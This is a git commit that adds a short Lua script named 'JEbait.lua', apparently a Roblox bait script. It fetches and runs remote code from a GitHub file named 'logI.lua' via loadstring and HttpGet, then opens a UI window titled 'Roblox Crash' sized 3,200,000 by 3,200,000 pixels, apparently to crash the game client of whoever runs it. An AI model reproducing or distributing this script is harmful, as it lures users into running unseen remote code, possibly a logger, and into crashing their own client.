f6128a45a3a992e8cc93b3ab62e2cecb757c73bd
DAa <103658363+Sittapea@users.noreply.github.com>
2022-11-16 13:14:40 +0200

    Create JEbait.lua

---
+++ JEbait.lua
@@ -0,0 +1,15 @@
+--JeBaitP1
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/TRoblox/main/logI.lua", true))()
+wait(0.1)
+
+--JeBaitP2
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/Gui-Ui/main/Module.lua"))()
+local UI = Library.Load({
+	Title = "Roblox Crash",
+	Style = 1,
+  SizeX = 3200000,
+	SizeY = 3200000,
+	Theme = Light,
+	ColorOverrides = {
+	}
+})
